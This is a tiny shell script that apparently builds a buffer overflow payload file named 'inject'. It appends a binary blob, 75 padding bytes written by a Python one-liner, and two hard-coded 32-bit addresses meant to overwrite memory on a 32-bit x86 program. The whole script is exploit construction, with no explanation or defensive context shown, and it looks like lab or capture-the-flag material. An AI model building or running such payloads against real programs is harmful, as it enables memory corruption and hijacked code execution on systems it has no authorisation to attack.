
rm -f inject
cat bin >> inject
chmod +w inject 

python -c 'import sys;	sys.stdout.write("B" * 75);' >> inject

echo -ne '\x7C\xA0\x04\x08' >> inject
echo -ne '\x0C\xA0\x04\x08' >> inject
